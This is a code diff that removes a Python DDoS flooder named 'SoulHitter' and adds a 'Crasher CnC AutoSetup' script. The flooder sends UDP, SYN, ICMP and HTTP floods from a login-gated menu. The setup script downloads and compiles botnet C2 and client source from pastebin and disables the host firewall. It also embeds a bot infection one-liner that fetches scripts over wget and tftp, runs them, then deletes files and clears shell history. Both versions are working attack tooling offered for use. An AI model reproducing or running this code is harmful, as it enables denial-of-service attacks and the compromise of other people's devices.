@@ -1,370 +1,53 @@
-﻿#!/usr/bin/env python3
-#-*- coding: utf-8 -*-
-import sys
-import socket
-import time
-import random
-import threading
-import getpass
-import os
+import subprocess
 
-methods = """\033[91m
-╔══════════════════════════════════════════════════════╗
-║                     \033[00mDDOS Methods\033[91m                     ║               
-║══════════════════════════════════════════════════════║
-║ \033[00mUDP (IP) (PORT) (TIME) (SIZE)  \033[91m|\033[00m UDP Attack.\033[91m         ║
-║ \033[00mSYN (IP) (PORT) (TIME) (SIZE)  \033[91m|\033[00m SYN Attack.\033[91m         ║
-║ \033[00mICMP (IP) (PORT) (TIME) (SIZE) \033[91m|\033[00m ICMP Attack.\033[91m        ║
-║ \033[00mHTTP (IP) (PORT) (TIME) (SIZE) \033[91m|\033[00m HTTP Attack.\033[91m        ║
-╚══════════════════════════════════════════════════════╝\033[00m
-"""
+def cri(cmd):
+    subprocess.call(cmd, shell=True)
+def replace_line(file_name, line_num, text):
+  lines = open(file_name, 'r').readlines()
+  lines[line_num] = text
+  out = open(file_name, 'w')
+  out.writelines(lines)
+  out.close()
 
-info = """\033[91m
-╔══════════════════════════════════════════════════════╗
-║                    \033[00mSoulHitter Info\033[91m                   ║
-║══════════════════════════════════════════════════════║
-║ \033[00m[+] SoulHitter was made by Ilias S.#0580.\033[91m            ║
-║ \033[00m[+] Always hit with safety.                               ║
-║ \033[00m[+] Hit them in the soul!\033[91m                            ║
-║ \033[00m[+] v1.0.3\033[91m                                           ║
-╚══════════════════════════════════════════════════════╝\033[00m
-"""
+print'\x1b[1;36m   _____               _               '
+print'\x1b[1;36m  / ____|             | |              '
+print'\x1b[1;36m | |     _ __ __ _ ___| |__   ___ _ __ '
+print'\x1b[1;36m | |    |  __/ _` / __|  _ \ / _ \  __|'
+print'\x1b[1;36m | |____| | | (_| \__ \ | | |  __/ |   '
+print'\x1b[1;36m  \_____|_|  \__,_|___/_| |_|\___|_|   '
+print'\x1b[1;36m                                       '
+print'\x1b[1;37m[\x1b[1;36mCrasher\x1b[1;37m] \x1b[1;37mCnC AutoSetup \nDeveloped By \x1b[0;31mFlexingOnLamers\x1b[1;37m/\x1b[0;31mCri'
 
-extras = """\033[91m
-╔══════════════════════════════════════════════════════╗
-║                        \033[00mExtras\033[91m                        ║
-║══════════════════════════════════════════════════════║
-║ \033[00mAttacks          \033[91m|\033[00m Shows How Many Running Attacks.\033[91m   ║
-║ \033[00mStop             \033[91m|\033[00m Stops All Running Attacks.\033[91m        ║
-║ \033[00mResolve (DOMAIN) \033[91m|\033[00m Grabs A Domains IP.\033[91m               ║
-╚══════════════════════════════════════════════════════╝\033[00m
-"""
+ip = raw_input("\x1b[1;37mEnter Your Server IP:\x1b[1;35m")
+user = raw_input("\x1b[1;37mEnter Desired Username:\x1b[1;35m")
+passw = raw_input("\x1b[1;37mEnter Desired Password:\x1b[1;35m")
+bport = raw_input("\x1b[1;37mEnter Desired BotPort:\x1b[0;31m")
+port = raw_input("\x1b[1;37mEnter The Port You Want to screen on:\x1b[1;35m")
 
-help = """\033[91m
-╔══════════════════════════════════════════════════════╗
-║                    \033[00mBasic Commands\033[91m                    ║
-║══════════════════════════════════════════════════════║
-║ \033[00mMethods \033[91m|\033[00m Shows DDOS Methods For SoulHitter.\033[91m         ║
-║ \033[00mExtras  \033[91m|\033[00m Shows Extra Commands For SoulHitter.\033[91m       ║
-║ \033[00mUpdates \033[91m|\033[00m Shows Update Notes For SoulHitter.\033[91m         ║
-║ \033[00mInfo    \033[91m|\033[00m Shows SoulHitter Info.\033[91m                     ║
-║ \033[00mClear   \033[91m|\033[00m Clears Screen.\033[91m                             ║
-║ \033[00mExit    \033[91m|\033[00m Exits Out Of SoulHitter.\033[91m                   ║
-╚══════════════════════════════════════════════════════╝\033[00m
-"""
+print '\x1b[1;35mInstalling Needed Dependencies..\x1b[1;37m'
+cri('yum update -y')
+cri('yum install python-paramiko gcc screen nano wget httpd iptables perl -y;')
+cri('yum install gcc cmake gmp gmp-devel libpcap-devel gengetopt byacc flex -y')
+cri('yum install json-c-doc.noarch json-c.i686 json-c.x86_64 json-c-devel.i686 json-c-devel.x86_64 -y')
+cri('yum install epel-release -y')
+cri('yum install gengetopt -y')
+cri('wget -q https://pastebin.com/raw/Hx6JmN35 -O crasher.c')
+cri('gcc -o crasher crasher.c -pthread')
+cri('rm -rf crasher.c')
+cri('wget -q https://pastebin.com/raw/J2W0uHsi -O client.c')
+cri('wget -q https://pastebin.com/raw/Ne69fRpz -O cc7.py')
+cri('service iptabes stop')
+cri('service httpd restart')
+cri('systemctl stop firewalld')
+cri('httpd -k restart')
+cri('httpd -krestart')
+cri('pkill screen')
 
-updatenotes = """\033[91m
-╔══════════════════════════════════════════════════════╗
-║                     \033[00mUpdate Notes\033[91m                     ║
-║══════════════════════════════════════════════════════║
-║ \033[00m[+] Timeout Bug Fixed.\033[91m                               ║
-║ \033[00m[+] Took Out Some Tools.\033[91m                             ║
-║ \033[00m[+] User And Pass Changed To SoulHitter.\033[91m             ║
-║ \033[00m[+] To Be A Guest Type "Guest" For User And Pass.\033[91m    ║
-║ \033[00m[+] All Tools Fixed And Working.\033[91m                     ║
-╚══════════════════════════════════════════════════════╝\033[00m
-"""
-
-banner = """
-                      :::!~!!!!!:.
-                  .xUHWH!! !!?M88WHX:.
-                .X*#M@$!!  !X!M$$$$$$WWx:.
-               :!!!!!!?H! :!$!$$$$$$$$$$8X:
-              !!~  ~:~!! :~!$!#$$$$$$$$$$8X:
-             :!~::!H!<   ~.U$X!?R$$$$$$$$MM!
-             ~!~!!!!~~ .:XW$$$U!!?$$$$$$RMM!
-               !:~~~ .:!M"T#$$$$WX??#MRRMMM!
-               ~?WuxiW*`   `"#$$$$8!!!!??!!!
-             :X- M$$$$       `"T#$T~!8$WUXU~
-            :%`  ~#$$$m:        ~!~ ?$$$$$$
-          :!`.-   ~T$$$$8xx.  .xWW- ~""##*"
-.....   -~~:<` !    ~?T#$$@@W@*?$$      /`
-W$@@M!!! .!~~ !!     .:XUW$W!~ `"~:    :
-#"~~`.:x%`!!  !H:   !WM$$$$Ti.: .!WUn+!`
-:::~:!!`:X~ .: ?H.!u "$$$B$$$!W:U!T$$M~
-.~~   :X@!.-~   ?@WTWo("*$$$W$TH$! `
-Wi.~!X$?!-~    : ?$$$B$Wu("**$RM!
-$R@i.~~ !     :   ~$$$$$B$$en:``
-?MXT@Wx.~    :     ~"##*$$$$M~             
-"""
-
-cookie = open(".CheatersParadise_Cookie","w+")
-
-fsubs = 0
-liips = 0
-tattacks = 0
-uaid = 0
-said = 0
-iaid = 0
-haid = 0
-aid = 0
-attack = True
-http = True
-udp = True
-syn = True
-icmp = True
-
-
-def synsender(host, port, timer, punch):
-	global said
-	global syn
-	global aid
-	global tattacks
-	timeout = time.time() + float(timer)
-	sock = socket.socket (socket.AF_INET, socket.SOCK_RAW, socket.TCP_SYNCNT)
-
-	said += 1
-	tattacks += 1
-	aid += 1
-	while time.time() < timeout and syn and attack:
-		sock.sendto(punch, (host, int(port)))
-	said -= 1
-	aid -= 1
-
-def udpsender(host, port, timer, punch):
-	global uaid
-	global udp
-	global aid
-	global tattacks
-
-	timeout = time.time() + float(timer)
-	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-	
-	uaid += 1
-	aid += 1
-	tattacks += 1
-	while time.time() < timeout and udp and attack:
-		sock.sendto(punch, (host, int(port)))
-	uaid -= 1
-	aid -= 1
-
-def icmpsender(host, port, timer, punch):
-	global iaid
-	global icmp
-	global aid
-	global tattacks
-
-	timeout = time.time() + float(timer)
-	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
-
-	iaid += 1
-	aid += 1
-	tattacks += 1
-	while time.time() < timeout and icmp and attack:
-		sock.sendto(punch, (host, int(port)))
-	iaid -= 1
-	aid -= 1
-
-def httpsender(host, port, timer, punch):
-	global haid
-	global http
-	global aid
-	global tattacks
-
-	timeout = time.time() + float(timer)
-
-	haid += 1
-	aid += 1
-	tattacks += 1
-	while time.time() < timeout and icmp and attack:
-		try:
-			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-			sock.sendto(punch, (host, int(port)))
-			sock.close()
-		except socket.error:
-			pass
-
-	haid -= 1
-	aid -= 1
-
-
-def main():
-	global fsubs
-	global liips
-	global tattacks
-	global uaid
-	global said
-	global iaid
-	global haid
-	global aid
-	global attack
-	global dp
-	global syn
-	global icmp
-	global http
-
-	while True:
-		sys.stdout.write("\x1b]2;ProFlex\x07")
-		sin = input("\033[1;00m[\033[91mSoulHitter\033[1;00m]# ").lower()
-		sinput = sin.split(" ")[0]
-		if sinput == "clear":
-			os.system ("clear")
-			print (banner)
-			main()
-		elif sinput == "help":
-			print (help)
-			main()
-		elif sinput == "extras":
-			print (extras)
-			main()
-		elif sinput == "exit":
-			print ("[\033[91mSoulHitter\033[00m] You Are Exiting Out Of SoulHitter.\n")
-			exit()
-		elif sinput == "methods":
-			print (methods)
-			main()
-		elif sinput == "updates":
-			print (updatenotes)
-			main()
-		elif sinput == "info":
-			print (info)
-			main()
-		elif sinput == "attacks":
-			print ("[\033[91mSoulHitter\033[00m] Total Attacks Running: {}\n".format (aid))
-			main()
-		elif sinput == "resolve":
-			liips += 1
-			host = sin.split(" ")[1]
-			host_ip = socket.gethostbyname(host)
-			print ("[\033[91mSoulHitter\033[00m] Host: {} \033[00m[\033[91mConverted\033[00m] {}\n".format (host, host_ip))
-			main()
-		elif sinput == "udp":
-			if username == "Guest":
-				print ("[\033[91mProFlex\033[00m] You Are Not Allowed To Use This Method.\n")
-				main()
-			else:
-				try:
-					sinput, host, port, timer, pack = sin.split(" ")
-					socket.gethostbyname(host)
-					print ("[\033[91mSoulHitter\033[00m] Attack Sent To: {}\n".format (host))
-					punch = random._urandom(int(pack))
-					threading.Thread(target=udpsender, args=(host, port, timer, punch)).start()
-				except ValueError:
-					print ("[\033[91mSoulHitter\033[00m] The Command {} Requires An Argument.\n".format (sinput))
-					main()
-				except socket.gaierror:
-					print ("[\033[91mSoulHitter\033[00m] Host: {} Invalid.\n".format (host))
-					main()
-		elif sinput == "http":
-			try:
-				sinput, host, port, timer, pack = sin.split(" ")
-				socket.gethostbyname(host)
-				print ("[\033[91mSoulHitter\033[00m] Attack Sent To: {}\n".format (host))
-				punch = random._urandom(int(pack))
-				threading.Thread(target=httpsender, args=(host, port, timer, punch)).start()
-			except ValueError:
-				print ("[\033[91mSoulHitter\033[00m] The Command {} Requires An Argument.\n".format (sinput))
-				main()
-			except socket.gaierror:
-				print ("[\033[91mSoulHitter\033[00m] Host: {} Invalid.\n".format (host))
-				main()
-		elif sinput == "icmp":
-			if username == "Guest":
-				print ("[\033[91mSoulHitter\033[00m] You Are Not Allowed To Use This Method.\n")
-				main()
-			else:
-				try:
-					sinput, host, port, timer, pack = sin.split(" ")
-					socket.gethostbyname(host)
-					print ("[\033[91mSoulHitter\033[00m] Attack Sent To: {}\n".format (host))
-					punch = random._urandom(int(pack))
-					threading.Thread(target=icmpsender, args=(host, port, timer, punch)).start()
-				except ValueError:
-					print ("[\033[91mSoulHitter\033[00m] The Command {} Requires An Argument.\n".format (sinput))
-					main()
-				except socket.gaierror:
-					print ("[\033[91mSoulHitter\033[00m] Host: {} Invalid.\n".format (host))
-					main()
-		elif sinput == "syn":
-			try:
-				sinput, host, port, timer, pack = sin.split(" ")
-				socket.gethostbyname(host)
-				print ("[\033[91mSoulHitter\033[00m] Attack Sent To: {}\n".format (host))
-				punch = random._urandom(int(pack))
-				threading.Thread(target=icmpsender, args=(host, port, timer, punch)).start()
-			except ValueError:
-				print ("[\033[91mSoulHitter\033[00m] The Command {} Requires An Argument.\n".format (sinput))
-				main()
-			except socket.gaierror:
-				print ("[\033[91mSoulHitter\033[00m] Host: {} Invalid.\n".format (host))
-				main()
-		elif sinput == "stop":
-			print ("[\033[91mSoulHitter\033[00m] All Running Attacks Have Been Stopped.\n")
-			attack = False
-			while not attack:
-				if aid == 0:
-					attack = True
-		elif sinput == "stop":
-			what = sin.split(" ")[1]
-			if what == "udp":
-				print ("Stopping All UDP Attacks.\n")
-				udp = False
-				while not udp:
-					if aid == 0:
-						print ("[\033[91mSoulHitter\033[00m] No UDP Processes Running.")
-						udp = True
-						main()
-			if what == "icmp":
-				print ("Stopping All ICMP Attacks.\n")
-				icmp = False
-				while not icmp:
-					print ("[\033[91mSoulHitter\033[00m] No ICMP Processes Running.")
-					udp = True
-					main()
-		else:
-			print ("[\033[91mProFlex\033[00m] {} Is Not A Command.\n".format(sinput))
-			main()
-
-
-
-try:
-	users = ["root", "Guest"]
-	clear = "clear"
-	os.system (clear)
-	username = getpass.getpass ("[+] Username: ")
-	if username in users:
-		user = username
-	else:
-		print ("[+] Incorrect, Exiting.\n")
-		exit()
-except KeyboardInterrupt:
-	exit()
-try:
-	passwords = ["root", "Guest"]
-	password = getpass.getpass ("[+] Password: ")
-	if user == "root":
-		if password == passwords[0]:
-			print ("[+] Login Correct.")
-			print ("[+] Type Help To See Commands.")
-			cookie.write("DIE")
-			time.sleep(3)
-			os.system (clear)
-			try:
-				os.system ("clear")
-				print (banner)
-				main()
-			except KeyboardInterrupt:
-				print ("\n[\033[91mSoulHitter\033[00m] Ctrl-C Has Been Pressed.\n")
-				main()
-		else:
-			print ("[+] Incorrect, Exiting.\n")
-			exit()
-	if user == "Guest":
-		if password == passwords[1]:
-			print ("[+] Login Correct Thanks You For using SoulHitter DDOS.")
-			print ("[+] Certain Methods Will Not Be Available To You.")
-			print ("[+] Type Help To See Commands.")
-			time.sleep(5)
-			os.system (clear)
-			try:
-				os.system ("clear")
-				print (banner)
-				main()
-			except KeyboardInterrupt:
-				print ("\n[\033[91mSoulHitter\033[00m] Ctrl-C Has Been Pressed.\n")
-				main()
-		else:
-			print ("[+] Incorrect, Exiting.\n")
-			exit()
-except KeyboardInterrupt:
-	exit()
+replace_line('client.c', 859,  'unsigned char *AllDemDupes[] = { "'+ ip +':'+ bport +'" };\n')
+replace_line('client.c', 861,  'char *infect = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://'+ ip +'/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp '+ ip +' -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g '+ ip +'; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf bins.sh tftp1.sh tftp2.sh; rm -rf *;history -c\r\n";\n')
+cri("echo "+ user +" "+ passw +" >> login.txt")
+cri("python cc7.py client.c "+ ip +"")
+cri("screen ./crasher "+ bport +" 1 "+ port +"")
+print '\x1b[1;37mT'
+print '\x1b[1;35mcd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://'+ ip +'/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp '+ ip +' -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g '+ ip +'; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf bins.sh tftp1.sh tftp2.sh; rm -rf *'
+print '\x1b[1;37mThank you '+ user +' for using the \x1b[1;37m[\x1b[0;31mCrasher\x1b[1;37m] \x1b[1;37mCnC AutoSetup \n\x1b[0;31mPastebin\x1b[1;37m:\x1b[1;36mhttps://pastebin.com/u/flexingonlamers \n\x1b[0;31mGithub\x1b[1;37m:\x1b[1;36mhttps://github.com/AgentCri/  \n\x1b[0;31mEmail\x1b[1;37m:\x1b[1;36mcri@null.net \n\x1b[0;31mDiscord\x1b[1;37m:\x1b[1;36mCri#4614'
